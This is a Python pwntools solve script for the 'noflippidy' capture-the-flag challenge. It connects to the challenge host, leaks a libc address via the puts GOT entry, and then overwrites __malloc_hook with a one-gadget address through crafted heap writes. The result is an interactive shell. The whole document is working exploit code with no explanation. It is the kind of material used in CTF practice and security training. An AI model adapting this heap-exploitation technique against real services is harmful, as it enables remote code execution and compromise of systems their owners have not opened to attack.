#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'noflippidy.hackable.software', 1337
binary = './noflippidy'
brkpts = '''
b malloc
c
'''

elf = ELF("noflippidy")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc.so.6'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def init(size):
    sla("be: ",str(size))

def add(idx, data, nl = True):
    sla(": ",'1')
    sla("Index: ",str(idx))
    if nl:
        sla("Content: ",data)
    else:
        sa("Content: ",data)

if __name__ == "__main__":
    init(0x20080000)
    add(0xfd98a, p64(0x41)*2 + p64(0x404000))
    add(0, "a")

    payload = "a"*0x10 + p64(0x404040)*3 + p64(elf.got['puts'])
    add(0, payload, False)

    for _ in range(3):
        reu("----- Menu -----\n")
    
    libc.address = uu64(rl().strip()) - libc.symbols['puts']

    gadget = libc.address + 0x10a41c

    log.info("Libc @ "+hex(libc.address))
    
    sl("1")

    add(0xfd98a, p64(0x41)*2 + p64(libc.symbols['__malloc_hook'] - 0x10))
    add(0, "a")

    payload = p64(gadget)*3
    add(0, payload, False)

    # gdb.attach(io, brkpts)

    for _ in range(3):
        sl("1")

    io.interactive()
